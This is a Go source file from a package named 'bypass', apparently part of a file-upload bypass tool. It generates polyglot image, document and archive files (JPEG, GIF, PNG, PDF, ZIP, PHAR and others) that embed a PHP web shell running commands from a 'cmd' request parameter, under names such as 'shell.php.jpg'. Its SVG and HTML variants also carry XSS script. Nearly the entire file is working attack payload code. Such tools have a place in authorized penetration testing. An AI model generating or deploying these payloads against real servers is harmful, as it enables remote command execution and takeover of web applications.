package bypass

import (
	"fux/config"
)

// PolyglotPayloads generates polyglot file payloads (valid as multiple formats)
func PolyglotPayloads() []config.BypassPayload {
	var payloads []config.BypassPayload

	// JPEG/PHP Polyglot
	// This is a valid JPEG that also contains executable PHP
	jpegPHPPolyglot := buildJPEGPHPPolyglot()
	payloads = append(payloads, config.BypassPayload{
		Name:        "JPEG/PHP Polyglot",
		FileName:    "shell.php.jpg",
		Content:     jpegPHPPolyglot,
		ContentType: "image/jpeg",
		Category:    "polyglot",
	})

	payloads = append(payloads, config.BypassPayload{
		Name:        "JPEG/PHP Polyglot (.php)",
		FileName:    "shell.php",
		Content:     jpegPHPPolyglot,
		ContentType: "image/jpeg",
		Category:    "polyglot",
	})

	// GIF/PHP Polyglot
	gifPHPPolyglot := buildGIFPHPPolyglot()
	payloads = append(payloads, config.BypassPayload{
		Name:        "GIF/PHP Polyglot",
		FileName:    "shell.php.gif",
		Content:     gifPHPPolyglot,
		ContentType: "image/gif",
		Category:    "polyglot",
	})

	payloads = append(payloads, config.BypassPayload{
		Name:        "GIF/PHP Polyglot (.gif)",
		FileName:    "shell.gif",
		Content:     gifPHPPolyglot,
		ContentType: "image/gif",
		Category:    "polyglot",
	})

	// PNG/PHP Polyglot
	pngPHPPolyglot := buildPNGPHPPolyglot()
	payloads = append(payloads, config.BypassPayload{
		Name:        "PNG/PHP Polyglot",
		FileName:    "shell.php.png",
		Content:     pngPHPPolyglot,
		ContentType: "image/png",
		Category:    "polyglot",
	})

	// BMP/PHP Polyglot
	bmpPHPPolyglot := buildBMPPHPPolyglot()
	payloads = append(payloads, config.BypassPayload{
		Name:        "BMP/PHP Polyglot",
		FileName:    "shell.php.bmp",
		Content:     bmpPHPPolyglot,
		ContentType: "image/bmp",
		Category:    "polyglot",
	})

	// PDF/PHP Polyglot
	pdfPHPPolyglot := buildPDFPHPPolyglot()
	payloads = append(payloads, config.BypassPayload{
		Name:        "PDF/PHP Polyglot",
		FileName:    "shell.php.pdf",
		Content:     pdfPHPPolyglot,
		ContentType: "application/pdf",
		Category:    "polyglot",
	})

	// ZIP/PHP Polyglot (PHP can be at the beginning)
	zipPHPPolyglot := buildZIPPHPPolyglot()
	payloads = append(payloads, config.BypassPayload{
		Name:        "ZIP/PHP Polyglot",
		FileName:    "shell.php.zip",
		Content:     zipPHPPolyglot,
		ContentType: "application/zip",
		Category:    "polyglot",
	})

	// TAR/PHP Polyglot
	tarPHPPolyglot := buildTARPHPPolyglot()
	payloads = append(payloads, config.BypassPayload{
		Name:        "TAR/PHP Polyglot",
		FileName:    "shell.php.tar",
		Content:     tarPHPPolyglot,
		ContentType: "application/x-tar",
		Category:    "polyglot",
	})

	// HTML/JS/PHP Polyglot
	htmlJSPHPPolyglot := buildHTMLJSPHPPolyglot()
	payloads = append(payloads, config.BypassPayload{
		Name:        "HTML/JS/PHP Polyglot",
		FileName:    "shell.php.html",
		Content:     htmlJSPHPPolyglot,
		ContentType: "text/html",
		Category:    "polyglot",
	})

	// SVG/XSS/PHP Polyglot
	svgPolyglot := buildSVGPolyglot()
	payloads = append(payloads, config.BypassPayload{
		Name:        "SVG/XSS/PHP Polyglot",
		FileName:    "shell.svg",
		Content:     svgPolyglot,
		ContentType: "image/svg+xml",
		Category:    "polyglot",
	})

	// ICO/PHP Polyglot
	icoPHPPolyglot := buildICOPHPPolyglot()
	payloads = append(payloads, config.BypassPayload{
		Name:        "ICO/PHP Polyglot",
		FileName:    "favicon.php.ico",
		Content:     icoPHPPolyglot,
		ContentType: "image/x-icon",
		Category:    "polyglot",
	})

	// PHAR Polyglot (valid JPEG and PHAR)
	pharPolyglot := buildPHARPolyglot()
	payloads = append(payloads, config.BypassPayload{
		Name:        "PHAR/JPEG Polyglot",
		FileName:    "shell.phar.jpg",
		Content:     pharPolyglot,
		ContentType: "image/jpeg",
		Category:    "phar-polyglot",
	})

	return payloads
}

// buildJPEGPHPPolyglot creates a minimal JPEG with PHP code
func buildJPEGPHPPolyglot() []byte {
	phpCode := []byte("<?php system($_GET['cmd']); ?>")

	// Start with JPEG SOI
	polyglot := []byte{0xFF, 0xD8, 0xFF, 0xE0}

	// APP0 JFIF marker with minimum valid structure
	app0 := []byte{
		0x00, 0x10, // Length (16 bytes)
		0x4A, 0x46, 0x49, 0x46, 0x00, // "JFIF\0"
		0x01, 0x01, // Version
		0x00,       // Units
		0x00, 0x01, // X density
		0x00, 0x01, // Y density
		0x00, 0x00, // Thumbnail
	}
	polyglot = append(polyglot, app0...)

	// Comment marker with PHP
	polyglot = append(polyglot, 0xFF, 0xFE)
	commentLen := len(phpCode) + 2
	polyglot = append(polyglot, byte(commentLen>>8), byte(commentLen&0xFF))
	polyglot = append(polyglot, phpCode...)

	// Minimal image data and EOI
	polyglot = append(polyglot, 0xFF, 0xD9)

	return polyglot
}

// buildGIFPHPPolyglot creates a GIF with embedded PHP
func buildGIFPHPPolyglot() []byte {
	// GIF89a header + comment extension with PHP
	polyglot := []byte("GIF89a")

	// Minimal screen descriptor
	polyglot = append(polyglot, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00)

	// Comment Extension containing PHP
	polyglot = append(polyglot, 0x21, 0xFE) // Extension introducer + comment label
	phpCode := []byte("<?php system($_GET['cmd']); ?>")
	polyglot = append(polyglot, byte(len(phpCode)))
	polyglot = append(polyglot, phpCode...)
	polyglot = append(polyglot, 0x00) // Block terminator

	// Image descriptor
	polyglot = append(polyglot, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00)

	// Minimal LZW compressed data
	polyglot = append(polyglot, 0x02, 0x02, 0x44, 0x01, 0x00)

	// Trailer
	polyglot = append(polyglot, 0x3B)

	return polyglot
}

// buildPNGPHPPolyglot creates a PNG with PHP in tEXt chunk
func buildPNGPHPPolyglot() []byte {
	phpCode := []byte("<?php system($_GET['cmd']); ?>")

	// PNG signature
	polyglot := []byte{0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A}

	// IHDR chunk (1x1 pixel, 8-bit RGB)
	ihdr := []byte{
		0x00, 0x00, 0x00, 0x0D, // Length
		0x49, 0x48, 0x44, 0x52, // "IHDR"
		0x00, 0x00, 0x00, 0x01, // Width: 1
		0x00, 0x00, 0x00, 0x01, // Height: 1
		0x08,             // Bit depth
		0x02,             // Color type (RGB)
		0x00, 0x00, 0x00, // Compression, filter, interlace
		0x90, 0x77, 0x53, 0xDE, // CRC
	}
	polyglot = append(polyglot, ihdr...)

	// iTXt chunk with PHP (uncompressed)
	keyword := []byte("Comment")
	iTXt := append([]byte("iTXt"), keyword...)
	iTXt = append(iTXt, 0x00, 0x00, 0x00, 0x00, 0x00) // Null terminators and flags
	iTXt = append(iTXt, phpCode...)

	chunkLen := len(iTXt) - 4
	polyglot = append(polyglot, byte(chunkLen>>24), byte(chunkLen>>16), byte(chunkLen>>8), byte(chunkLen))
	polyglot = append(polyglot, iTXt...)
	polyglot = append(polyglot, 0x00, 0x00, 0x00, 0x00) // CRC placeholder

	// IDAT chunk (minimal valid data)
	idat := []byte{
		0x00, 0x00, 0x00, 0x0C, // Length
		0x49, 0x44, 0x41, 0x54, // "IDAT"
		0x08, 0xD7, 0x63, 0xF8, 0xFF, 0xFF, 0xFF, 0x00, 0x05, 0xFE, 0x02, 0xFE,
	}
	polyglot = append(polyglot, idat...)

	// IEND chunk
	iend := []byte{
		0x00, 0x00, 0x00, 0x00,
		0x49, 0x45, 0x4E, 0x44,
		0xAE, 0x42, 0x60, 0x82,
	}
	polyglot = append(polyglot, iend...)

	return polyglot
}

// buildBMPPHPPolyglot creates a BMP with PHP in comment area
func buildBMPPHPPolyglot() []byte {
	phpCode := []byte("<?php system($_GET['cmd']); ?>")

	// BMP header
	polyglot := []byte{
		0x42, 0x4D, // "BM"
		0x46, 0x00, 0x00, 0x00, // File size (70 bytes + php)
		0x00, 0x00, // Reserved
		0x00, 0x00, // Reserved
		0x36, 0x00, 0x00, 0x00, // Pixel data offset
	}

	// DIB header (BITMAPINFOHEADER)
	dib := []byte{
		0x28, 0x00, 0x00, 0x00, // DIB header size
		0x01, 0x00, 0x00, 0x00, // Width: 1
		0x01, 0x00, 0x00, 0x00, // Height: 1
		0x01, 0x00, // Color planes
		0x18, 0x00, // Bits per pixel (24)
		0x00, 0x00, 0x00, 0x00, // Compression
		0x0C, 0x00, 0x00, 0x00, // Image size
		0x00, 0x00, 0x00, 0x00, // Horizontal resolution
		0x00, 0x00, 0x00, 0x00, // Vertical resolution
		0x00, 0x00, 0x00, 0x00, // Colors in palette
		0x00, 0x00, 0x00, 0x00, // Important colors
	}
	polyglot = append(polyglot, dib...)

	// Pixel data (1 white pixel + padding)
	polyglot = append(polyglot, 0xFF, 0xFF, 0xFF, 0x00)

	// Append PHP code after valid BMP
	polyglot = append(polyglot, phpCode...)

	return polyglot
}

// buildPDFPHPPolyglot creates a PDF with PHP
func buildPDFPHPPolyglot() []byte {
	phpCode := `<?php system($_GET['cmd']); ?>`

	pdf := `%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
endobj
%%EOF
` + phpCode

	return []byte(pdf)
}

// buildZIPPHPPolyglot creates a valid ZIP that starts with PHP
func buildZIPPHPPolyglot() []byte {
	phpCode := []byte("<?php system($_GET['cmd']); __halt_compiler(); ?>")

	// ZIP local file header
	zipData := []byte{
		0x50, 0x4B, 0x03, 0x04, // Local file header signature
		0x0A, 0x00, // Version needed
		0x00, 0x00, // General purpose bit flag
		0x00, 0x00, // Compression method
		0x00, 0x00, // Last mod file time
		0x00, 0x00, // Last mod file date
		0x00, 0x00, 0x00, 0x00, // CRC-32
		0x00, 0x00, 0x00, 0x00, // Compressed size
		0x00, 0x00, 0x00, 0x00, // Uncompressed size
		0x08, 0x00, // File name length
		0x00, 0x00, // Extra field length
	}
	zipData = append(zipData, []byte("test.txt")...)

	// Prepend PHP code (will be ignored by ZIP parser)
	polyglot := phpCode
	polyglot = append(polyglot, zipData...)

	return polyglot
}

// buildTARPHPPolyglot creates a TAR with PHP
func buildTARPHPPolyglot() []byte {
	phpCode := []byte("<?php system($_GET['cmd']); ?>")

	// TAR file entry (simplified)
	tarHeader := make([]byte, 512)
	copy(tarHeader[0:100], "shell.php")
	copy(tarHeader[100:108], "0000644\x00")
	copy(tarHeader[108:116], "0000000\x00")
	copy(tarHeader[116:124], "0000000\x00")
	copy(tarHeader[124:136], "00000000036\x00")
	copy(tarHeader[136:148], "00000000000\x00")
	copy(tarHeader[156:157], "0")
	copy(tarHeader[257:265], "ustar\x0000")

	polyglot := tarHeader
	polyglot = append(polyglot, phpCode...)

	// Pad to 512 byte boundary
	padding := 512 - (len(phpCode) % 512)
	polyglot = append(polyglot, make([]byte, padding)...)

	return polyglot
}

// buildHTMLJSPHPPolyglot creates an HTML/JS/PHP polyglot
func buildHTMLJSPHPPolyglot() []byte {
	polyglot := `<!-- <?php system($_GET['cmd']); ?> -->
<!DOCTYPE html>
<html>
<head><title>Test</title></head>
<body>
<script>
var x = "<?php echo 'XSS'; ?>";
</script>
</body>
</html>`

	return []byte(polyglot)
}

// buildSVGPolyglot creates an SVG with XSS and PHP
func buildSVGPolyglot() []byte {
	polyglot := `<?xml version="1.0"?>
<?php system($_GET['cmd']); ?>
<svg xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">
alert('XSS');
</script>
<text x="10" y="20"><?php echo 'test'; ?></text>
</svg>`

	return []byte(polyglot)
}

// buildICOPHPPolyglot creates an ICO with PHP
func buildICOPHPPolyglot() []byte {
	phpCode := []byte("<?php system($_GET['cmd']); ?>")

	// ICO header
	ico := []byte{
		0x00, 0x00, // Reserved
		0x01, 0x00, // Image type (1 = icon)
		0x01, 0x00, // Number of images
	}

	// ICONDIRENTRY
	ico = append(ico, []byte{
		0x01,       // Width
		0x01,       // Height
		0x00,       // Color palette
		0x00,       // Reserved
		0x01, 0x00, // Color planes
		0x20, 0x00, // Bits per pixel
		0x2E, 0x00, 0x00, 0x00, // Size of image data
		0x16, 0x00, 0x00, 0x00, // Offset to image data
	}...)

	// BMP data (minimal)
	bmp := []byte{
		0x28, 0x00, 0x00, 0x00, // DIB header size
		0x01, 0x00, 0x00, 0x00, // Width
		0x02, 0x00, 0x00, 0x00, // Height (doubled for XOR+AND mask)
		0x01, 0x00, // Planes
		0x20, 0x00, // Bits per pixel
		0x00, 0x00, 0x00, 0x00, // Compression
		0x00, 0x00, 0x00, 0x00, // Image size
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Resolution
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Colors
	}
	ico = append(ico, bmp...)

	// Pixel data
	ico = append(ico, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00)

	// Append PHP
	ico = append(ico, phpCode...)

	return ico
}

// buildPHARPolyglot creates a PHAR archive that's also valid as JPEG
func buildPHARPolyglot() []byte {
	// Start with valid JPEG
	jpeg := []byte{0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10}
	jpeg = append(jpeg, []byte("JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00")...)

	// PHAR stub that works as JPEG comment
	stub := `<?php __HALT_COMPILER(); ?>`
	pharData := []byte(stub)

	// Minimal PHAR manifest
	manifest := []byte{
		0x00, 0x00, 0x00, 0x00, // Manifest length (placeholder)
		0x01, 0x00, 0x00, 0x00, // Number of files
		0x11, 0x00, // API version
		0x00, 0x00, 0x00, 0x00, // Global flags
		0x00, 0x00, 0x00, 0x00, // Alias length
		0x00, 0x00, 0x00, 0x00, // Metadata length
	}
	pharData = append(pharData, manifest...)

	// Combine as JPEG comment
	polyglot := jpeg
	polyglot = append(polyglot, 0xFF, 0xFE) // Comment marker
	commentLen := len(pharData) + 2
	polyglot = append(polyglot, byte(commentLen>>8), byte(commentLen&0xFF))
	polyglot = append(polyglot, pharData...)
	polyglot = append(polyglot, 0xFF, 0xD9) // EOI

	return polyglot
}
